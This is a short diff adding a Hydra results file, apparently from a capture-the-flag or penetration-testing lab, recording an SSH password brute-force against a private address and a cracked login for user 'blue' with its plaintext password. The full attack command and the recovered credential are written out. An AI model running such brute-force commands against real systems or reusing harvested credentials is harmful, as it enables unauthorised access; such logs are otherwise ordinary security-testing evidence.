@@ -1,0 +1,2 @@
+# Hydra v9.7 run at 2026-07-01 14:03:36 on 10.67.174.191 ssh (hydra -l blue -P content/passlist_hashcat.txt -t 4 -f -o evidence/hydra_blue_lfi.txt ssh://10.67.174.191)
+[22][ssh] host: 10.67.174.191   login: blue   password: !dr0w$s@p_r3pus
